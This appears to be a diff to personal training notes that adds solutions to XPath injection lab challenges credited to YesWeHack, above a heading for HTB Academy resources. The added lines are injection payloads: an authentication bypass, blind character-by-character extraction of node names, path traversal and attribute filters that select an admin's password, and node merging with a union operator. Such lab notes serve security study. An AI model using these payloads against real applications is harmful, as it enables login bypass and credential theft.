@@ -1,4 +1,47 @@
+# YesWeHack
+### Simple Login Bypass by YesWeHack
+```
+$pass = ' or '1
+```
+### Schema recovery by YesWeHack
+```
+$user = a' or name(/db/*[position() = 2]) = "FLAG-5468421" and '1 -> true
+
+Explanation
+First you can get the number of child in a node with this query
+
+$user = a' or count(/*) = 1 and '1  -> true
+
+$user = a' or count(/db/*) = 1 and '1  -> false
+
+$user = a' or count(/db/*) = 2 and '1  -> true
+
+Next you need to find the same of the node. By using the substring function it's possible to test each characters separately.
+
+$user = a' or substring(name(/db/*[position() = 2]), 1, 1) = "A" and '1  -> false
+
+$user = a' or substring(name(/db/*[position() = 2]), 1, 1) = "F" and '1  -> true
+
+$user = a' or substring(name(/db/*[position() = 2]), 1, 2) = "FL" and '1  -> true
+```
+### Going up by YesWeHack
+```
+$user = admin $node = ../password
+```
+### Attributes by YesWeHack
+```
+$user = guest $node = ../../user[@role="ADMIN" and username != "admin"]/password
+```
+### Merging nodes by YesWeHack
+```
+$user = admin $node = a | / | 
+```
+
+
+
+
 # HTB_Academy
+
 HTB_Academy Resources
 
 ```bash
